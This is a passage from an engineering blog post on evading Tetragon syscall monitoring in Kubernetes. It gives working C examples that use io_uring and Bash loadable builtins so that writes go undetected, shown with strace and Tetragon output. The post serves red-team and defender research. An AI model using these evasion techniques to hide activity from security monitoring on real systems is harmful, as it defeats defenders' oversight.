arch_prctl(0x3001 /* ARCH_??? */, 0x7ffcf4e0cf80) = -1 EINVAL (Invalid argument)
brk(NULL)                               = 0x6d8000
brk(0x6d91c0)                           = 0x6d91c0
arch_prctl(ARCH_SET_FS, 0x6d8880)       = 0
uname({sysname="Linux", nodename="lab", ...}) = 0
readlink("/proc/self/exe", "/home/ubuntu/writev", 4096) = 19
brk(0x6fa1c0)                           = 0x6fa1c0
brk(0x6fb000)                           = 0x6fb000
mprotect(0x4bd000, 12288, PROT_READ)    = 0
writev(1, [{iov_base="Writing using writev()!\n\0", iov_len=25}], 1Writing using writev()!
) = 25
exit_group(0)                           = ?
+++ exited with 0 +++</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">From the output we can see the<em>writev(2)</em>system call is called by the<em>writev</em>program.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>writev(1, [{iov_base="Writing using writev()!\n\0", iov_len=25}], 1) = 25</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Executing the program in the<em>demo</em>pod allows us to confirm that the system call is not detected.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl exec -it demo -- writev
Writing using writev()!</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">From the output, as expected, Tetragon is unable to detect the<em>writev(2)</em>system call because it does not match the TracingPolicy.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe --namespace default --pod demo
 process default/demo /usr/bin/writev                                   
 exit    default/demo /usr/bin/writev  0                                            </code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">These limitations although obvious and expected from such a simple example rule is still worth mentioning, as this is a recurring problem for security monitoring tools, often expressed as a cat-and-mouse game. Defenders will increase the coverage of their rules and adversaries will look for exceptions and fringe cases.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">A less intuitive example of this issue can occur with the<em>sendfile(2)</em>system call, used to transfer data between file descriptors, and in practice<a href="https://man7.org/linux/man-pages/man2/sendfile.2.html" class="text-azure no-underline hover:underline last:mb-0">sendfile(2)</a>a combination of the<em>read(2)</em>and<em>write(2)</em>system calls.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0"><em>sendfile(2)</em>synopsis</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>#include &lt;sys/sendfile.h>

ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The<em>sendfile(2)</em>system call is used as an example by BusyBox, a software suite that provides several Unix utilities in a single executable file commonly present in container images. If not taken into consideration when developing detection policies equivalent functions even when not intentionally misused can still be abused by an adversary to bypass detection.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Executing<em>busybox</em>with<em>strace</em>we can verify what system calls are being called.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ strace busybox cat /etc/hostname
[...snip...]
openat(AT_FDCWD, "/etc/hostname", O_RDONLY) = 3
sendfile(1, 3, NULL, 16777216lab
)          = 4
sendfile(1, 3, NULL, 16777216)          = 0
close(3)                                = 0
exit_group(0)                           = ?
+++ exited with 0 +++</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Execution</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl exec -it demo -- busybox cat /etc/hostname
demo</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Output</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code> process default/demo /usr/bin/busybox cat /etc/hostname                
 exit    default/demo /usr/bin/busybox cat /etc/hostname 0     </code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Enter theio_uring</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Now that we have seen how system call detection can be bypassed using equivalent functions, let's look at a more generic and novel way to bypass system call monitoring, taking advantage of<em>io_uring</em>. This new asynchronous I/O API for Linux was created by Jens Axboe from Facebook to address performance issues with similar interfaces provided by functions like<em>read</em>,<em>write</em>and other functions that operate on data accessed by sockets and file descriptors.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The purpose of this example is not to bypass detection using another equivalent function, but to observe how the new asynchronous I/O APIs for Linux can present new challenges to security monitoring tools.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0"><strong>io_uringa high level overview</strong></p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The<em>io_uring</em>asynchronous I/O API was introduced in Linux kernel version 5.1 (March 2019) and consists of three system calls,<em>io_uring_setup(2)</em>,<em>io_uring_register(2)</em>and<em>io_uring_enter(2)</em>. The<em>io_uring</em>instance uses two rings, a submission queue (SQ) for submission of requests and a completion queue (CQ) that informs about the completion of those requests, shared between the kernel and the program using<em>io_uring_setup()</em>and mapped using two<em>mmap(2)</em>calls.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The program creates one or more SQ entries (SQE) instructing<em>io_uring</em>what asynchronous I/O operation it needs to get done, <em>readv(2</em>) or <em>writev(2)</em> for example, and then updates the SQ tail. The kernel reads the SQEs, and updates the SQ head.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The kernel then creates CQ entries (CQE) for one or more of the completed requests and updates the CQ tail. The program then consumes the CQEs and updates the CQ head. An important note is that completion events can arrive in any order, associated only with the specific SQEs.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0"><strong>The bypass</strong></p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">With this in mind, we can write a small C program to bypass system call monitoring.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>#include &lt;liburing.h>

int main()
{
	struct iovec vecs;
	struct io_uring ring;
	struct io_uring_cqe *cqe;
	struct io_uring_sqe *sqe;

	vecs.iov_base = "Writing using io_uring!\n";
	vecs.iov_len = 25;

	io_uring_queue_init(8, &ring, 0);

	sqe = io_uring_get_sqe(&ring);

	io_uring_prep_writev(sqe, 1, &vecs, 1, 0);

	io_uring_submit(&ring);

	io_uring_wait_cqe(&ring, &cqe);

	io_uring_cqe_seen(&ring, cqe);
}</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">In the program the<em>io_uring_queue_init()</em>function executes the<em>io_uring_setup</em>syscall to initialise the submission and completion queues in the kernel and then maps the resulting file descriptor to memory shared between the program and the kernel.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Thei<em>o_uring_get_sqe()</em>function gets the next vacant event from the submission queue belonging to the ring param and returns a pointer to the submission queue event.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Then the ring SQE is fetched and prepared for theIORING_OP_WRITEVoperation which provides an asynchronous interface to<em>write(2)</em>system call using the<a href="https://github.com/axboe/liburing" class="text-azure no-underline hover:underline last:mb-0">liburing</a><em>io_uring_prep_writev()</em>helper function.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The SQE is submitted with a call to<em>io_uring_submit()</em>that returns the number of submitted SQEs and our program waits for a completion by calling<em>io_uring_wait_cqe()</em>, finally the program callsi<em>o_uring_cqe_seen()</em>to inform the kernel that the given CQE has been consumed.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Executing the<em>uwrite</em>program with<em>strace</em>allows us to verify that it is only calling the<em>io_uring_setup(2)</em>,<em>mmap(2)</em>and<em>io_uring_enter(2)</em>system calls while still writing the message to standard output.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ strace ./uwrite
execve("./uwrite", ["./uwrite"], 0x7ffde19a0850 /* 24 vars */) = 0
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe7d93b6a0) = -1 EINVAL (Invalid argument)
brk(NULL)                               = 0x1ede000
brk(0x1edf1c0)                          = 0x1edf1c0
arch_prctl(ARCH_SET_FS, 0x1ede880)      = 0
uname({sysname="Linux", nodename="lab", ...}) = 0
readlink("/proc/self/exe", "/home/ubuntu/uwrite", 4096) = 19
brk(0x1f001c0)                          = 0x1f001c0
brk(0x1f01000)                          = 0x1f01000
mprotect(0x4be000, 12288, PROT_READ)    = 0
io_uring_setup(8, {flags=0, sq_thread_cpu=0, sq_thread_idle=0, sq_entries=8, cq_entries=16, features=IORING_FEAT_SINGLE_MMAP|IORING_FEAT_NODROP|IORING_FEAT_SUBMIT_STABLE|IORING_FEAT_RW_CUR_POS|IORING_FEAT_CUR_PERSONALITY|0x7e0, sq_off={head=0, tail=64, ring_mask=256, ring_entries=264, flags=276, dropped=272, array=576}, cq_off={head=128, tail=192, ring_mask=260, ring_entries=268, overflow=284, cqes=320, resv=[0x118, 0]}}) = 3
mmap(NULL, 608, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, 3, 0) = 0x7f961a244000
mmap(NULL, 512, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, 3, 0x10000000) = 0x7f961a243000
io_uring_enter(3, 1, 0, 0, NULL, 8Writing using io_uring!
)     = 1
exit_group(0)                           = ?
+++ exited with 0 +++</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Running the program in the<em>demo</em>pod confirms that the write operation was not detected.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl exec -it demo -- uwrite
Writing using io_uring!</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">From the output, as expected, Tetragon is unable to detect the write operation.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code> process default/demo /usr/bin/uwrite                                   
 exit    default/demo /usr/bin/uwrite  0                       </code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">In summary, <em>io_uring</em> is effectively a runtime for processing I/O requests, that spawns threads, sets up work queues, and dispatches requests for processing. Using asynchronous I/O increases complexity, making it harder for runtime security enforcement and observability tools to filter, block and react to events, requiring tools to keep track of the process, submitted requests and increasing the complexity of the rules.</p></div></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">One more thing</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">After successfully bypassing the write operation detection there is still one more thing that we can try to bypass: the process calling the write operation. Since security tools also monitor process execution events, a new binary spanning a process even if not associated with system call activity is always prone to raise an alert.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">To tamper with the process execution context, we will look at Bash builtin commands to execute the write operation directly, without invoking another program.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">First, let's rewrite our baseline example so it can be loaded in Bash using the<em>enable</em>command.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>#include "/usr/include/bash/builtins.h"

int writeb_builtin_load ()
{
    write(1,"Writing using writeb!\n",23); 
    return (1);
}

struct builtin writeb_struct = {
	"writeb",		/* builtin name */
	NULL,			/* function implementing the builtin */
	0x1,			/* this builtin is enabled. */
	NULL,			/* array of long documentation strings. */
	NULL,			/* usage synopsis; becomes short_doc */
	0			/* reserved for internal use */
};</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Loading the shared library shows that Bash builtin commands can be used to run code in the Bash execution context.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ bash -c 'enable -f ./writeb.so writeb'
Writing using writeb!</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">From the<em>strace</em>output we can see that the<em>write(2)</em>system call is called by Bash itself.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ strace bash -c 'enable -f ./writeb.so writeb'
[...snip...]
write(1, "Writing using writeb!\n\0", 23Writing using writeb!
) = 23
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
exit_group(0)                           = ?
+++ exited with 0 +++</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">This technique allows us to decouple the write operation from the execution context of the process and adds another layer of complexity to the attack.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Running the program in the<em>demo</em>pod shows that the write operation executes normally.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl exec -it demo -- bash -c 'enable -f ./writeb writeb'
Writing using writeb!</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">But on Tetragon's output, the write operation is now executed in the Bash execution context.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code> process default/demo /usr/bin/bash -c "enable -f ./writeb writeb"   
 write   default/demo /usr/bin/bash  23 bytes                           
 exit    default/demo /usr/bin/bash -c "enable -f ./writeb writeb" 0 </code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">This technique we can build bypass using <em>io_uring</em> what will run in the Bash execution context.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>#include &lt;liburing.h>
#include "/usr/include/bash/builtins.h"

int uwriteb_builtin_load ()
{
	struct iovec vecs;
	struct io_uring ring;
	struct io_uring_cqe *cqe;
	struct io_uring_sqe *sqe;

	vecs.iov_base = "Writing from bash using io_uring!\n";
	vecs.iov_len = 34;

	io_uring_queue_init(8, &ring, 0);

	sqe = io_uring_get_sqe(&ring);

	io_uring_prep_writev(sqe, 1, &vecs, 1, 0);

	io_uring_submit(&ring);

	io_uring_wait_cqe(&ring, &cqe);

	io_uring_cqe_seen(&ring, cqe);

    return (1);
}

struct builtin uwriteb_struct = {
	"uwriteb",		/* builtin name */
	NULL,			/* function implementing the builtin */
	0x1,			/* this builtin is enabled. */
	NULL,			/* array of long documentation strings. */
	NULL,			/* usage synopsis; becomes short_doc */
	0			/* reserved for internal use */
};</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Running the program in the<em>demo</em>pod shows that the write operation executes normally.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl exec -it demo -- bash -c 'enable -f ./uwriteb uwriteb'
Writing from bash using io_uring!</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">On Tetragon's output, the write operation is not detected and it is executed in the Bash execution context.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe --namespace default --pod demo
 process default/demo /usr/bin/bash -c "enable -f ./uwriteb uwriteb"     
 exit    default/demo /usr/bin/bash -c "enable -f ./uwriteb uwriteb" 0 </code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Conclusion</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">This blog post introduced some of the limitations and challenges faced by the defensive teams and basic techniques used regularly by red teams and adversaries. The techniques and limitations described in this blog post are not exclusive to Tetragon, affecting other monitoring solutions that use similar system call detection rules. Although by no means exhaustive, I hope that the techniques presented will inspire both teams to improve and keep the cat-and-mouse engaging for some time.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0"><strong>Further reading</strong></p><ul class="pl-8 list-none mb-5.5 last:mb-0"><li class="list-disc text-size-p-mobile last:mb-0"><a href="https://github.com/cilium/tetragon" class="text-azure no-underline hover:underline last:mb-0">Tetragon</a></li><li class="list-disc text-size-p-mobile last:mb-0"><a href="https://ebpf.io/" class="text-azure no-underline hover:underline last:mb-0">eBPF</a></li><li class="list-disc text-size-p-mobile last:mb-0"><a href="https://github.com/axboe/liburing" class="text-azure no-underline hover:underline last:mb-0">liburing</a></li><li class="list-disc text-size-p-mobile last:mb-0"><a href="https://unixism.net/loti/" class="text-azure no-underline hover:underline last:mb-0">Lord of the io_uring</a></li><li class="list-disc text-size-p-mobile last:mb-0"><a href="https://gtfobins.github.io/gtfobins/bash/#library-load" class="text-azure no-underline hover:underline last:mb-0">GTFOBins</a></li></ul></div></div></div></div><div class="py-[40px] lg:py-[80px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><section data-fetch-key="Author:0"><div class="grid grid-cols-12 gap-4"><div class="col-span-3"><span class="inline-block relative mb-4 overflow-hidden cursor-pointer group w-full"><img srcset="/_prismic-media/9a67e1b1b29ee7d4381bdee16c4696054da2770ec7f529736992d8539aa4bac3.jpeg 1024w,/_prismic-media/8248ef100e96420bc772b91a57b80900d339ac3f9dff41b4ddcb92a758fa3472.jpeg 640w" sizes="(min-width: 1024px) 1024px,(min-width: 640px) 640px" src="/_prismic-media/9a67e1b1b29ee7d4381bdee16c4696054da2770ec7f529736992d8539aa4bac3.jpeg" class="rounded-lg overflow-hidden w-full"> <span class="inline-block absolute bottom-8 right-8 transition-all translate-y-full opacity-0 pointer-events-none group-hover:translate-y-0 group-hover:opacity-100 group-hover:pointer-events-auto"><button class="flex items-center group text-dark-navy font-mulish font-bold text-base rounded-full leading-snug px-6 py-3.75 active:opacity-80 !py-2.5 !pl-2.5 bg-soft-white text-dark-navy"><img src="/_nuxt/img/plus-24px-dark.34e7c47.svg" alt="plus-24px-dark" class="mr-3">
        Read bio
       <!----></button></span></span></div> <div class="flex flex-col col-span-9"><span class="font-roboto mb-2 font-semibold"> by Daniel Teixeira </span> <span class="font-roboto">
        Lead of Offensive Security
      </span></div></div> <!----></section></div></div><div data-fetch-key="LatestPosts:0" class="py-[40px] lg:py-[80px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="grid items-end grid-cols-1 mb-10 md:grid-rows-1 md:grid-cols-2"><div><!----> <div><div><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Further resources</h4></div></div> <!----></div> <!----></div> <div class="grid grid-cols-12 gap-4"><a href="/engineering/content/podcast-remote-work" class="min-h-[428px] col-span-full md:col-span-4"><div class="box-border p-6 lg:p-8 rounded-2xl grid justify-between gap-20 h-full hover:shadow-innerLarge bg-teal text-dark-navy"><div class="col-span-1 flex flex-col justify-between gap-4"><div><p class="flex leading-4 mb-2"><span class="capitalize">blogs</span> <span class="mx-1 text-[30px]"></span>
          4 min
        </p> <div class="mb-6"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">.tech Podcast - Flexible remote working at Form3</h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Jordan Van Dyk is Form3's first Canada based engineer. He joins us to share why he chose to work at Form3, what his interview experience was and what a typical day looks like for him on the Tooling team. Then, he shares how his team works and makes recommendations for how highly distributed teams can successfully work together.</p></div></div> <p>November 17, 2022</p></div> <!----></div></a><a href="/engineering/content/nacls-blogpost" class="min-h-[428px] col-span-full md:col-span-4"><div class="box-border p-6 lg:p-8 rounded-2xl grid justify-between gap-20 h-full hover:shadow-innerLarge bg-sky-blue text-dark-navy"><div class="col-span-1 flex flex-col justify-between gap-4"><div><p class="flex leading-4 mb-2"><span class="capitalize">blogs</span> <span class="mx-1 text-[30px]"></span>
          6 min
        </p> <div class="mb-6"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">NACLS? Ain't nobody got time for that!</h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">In this blogpost, Adam will try to convince you to implement AWS NACL as additional layer of network protection. He will go through some basics, present some best practices that you could leverage and in the end show how easy it is to implement NACLs in Terraform.</p></div></div> <p>November 10, 2022</p></div> <!----></div></a><a href="/engineering/content/buckle-up-your-mtls-with-oauth-2-0-client-authentication" class="min-h-[428px] col-span-full md:col-span-4"><div class="box-border p-6 lg:p-8 rounded-2xl grid justify-between gap-20 h-full hover:shadow-innerLarge bg-ocean-blue text-soft-white"><div class="col-span-1 flex flex-col justify-between gap-4"><div><p class="flex leading-4 mb-2"><span class="capitalize">blogs</span> <span class="mx-1 text-[30px]"></span>
          7 min
        </p> <div class="mb-6"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Buckle Up Your mTLS With OAuth 2.0 Client Authentication and Certificate-Bound Access</h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Application security is a persistent hot topic in the technology industry. It is quite common to usemTLSin a business-to-business application, where security is incredibly important, and which uses thezero trust security model. mTLS is also popular with microservices and service mesh to ensure that sensitive resources are not accessible to unauthorised services in the network. mTLS is a transport layer authentication protocol. In this article, Milap Neupane explains: the basics of the mTLS and OAuth 2.0 protocol, the potential drawbacks with mTLS and how OAuth 2.0 Client Authentication and Certificate-Bound Access help improve security.</p></div></div> <p>October 13, 2022</p></div> <!----></div></a></div></div></div></div></div> <footer class="bg-soft-white text-dark-navy font-mulish pt-16"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="flex flex-col justify-between gap-8 py-16 border-t border-b lg:flex-row border-opacity-20 border-dark-navy"><div><div class="flex items-center justify-between"><h5 class="w-full mb-4 cursor-pointer lg:w-auto lg:cursor-auto">
            Updates
          </h5> <img src="/_nuxt/img/chevron-down-20px-dark.2c1d915.svg" alt="chevron-down-20px-dark" class="ml-2 -rotate-180"></div> <div><ul class="leading-9"><li><a href="/why-form3/insights">
                Newest releases
              </a></li> <li><a href="/engineering/content" class="nuxt-link-active">
                Engineering blog
              </a></li></ul></div></div> <div><div class="flex items-center justify-between"><h5 class="w-full mb-4 cursor-pointer lg:w-auto lg:cursor-auto">
            Developers
          </h5> <img src="/_nuxt/img/chevron-down-20px-dark.2c1d915.svg" alt="chevron-down-20px-dark" class="ml-2 -rotate-180"></div> <div><ul class="leading-9"><li><a href="https://api-docs.form3.tech/" target="_blank">
                API documentation
              </a></li> <li><a href="/engineering/life-at-form3">
                Life as a Form3 engineer
              </a></li></ul></div></div> <div><div class="flex items-center justify-between"><h5 class="w-full mb-4 cursor-pointer lg:w-auto lg:cursor-auto">
            About Form3
